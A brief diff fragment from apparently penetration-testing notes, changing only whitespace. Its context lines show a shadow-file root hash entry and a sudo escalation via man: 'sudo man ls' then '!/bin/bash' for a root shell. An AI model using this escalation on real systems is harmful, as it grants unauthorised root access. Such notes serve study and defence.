@@ -10,7 +10,7 @@
       - __`root:$1$abc$DSFILJKSD7393llsd.0s/:1772:0:99999:7:::`__
      
 
-  # sudo -l
+ # sudo -l
 - __1.root) NOPASSWD: /usr/bin/man__
     - __Type this `sudo man ls` it will display document of the ls__
     - __In the document itself `type !/bin/bash` you will get the root shell__
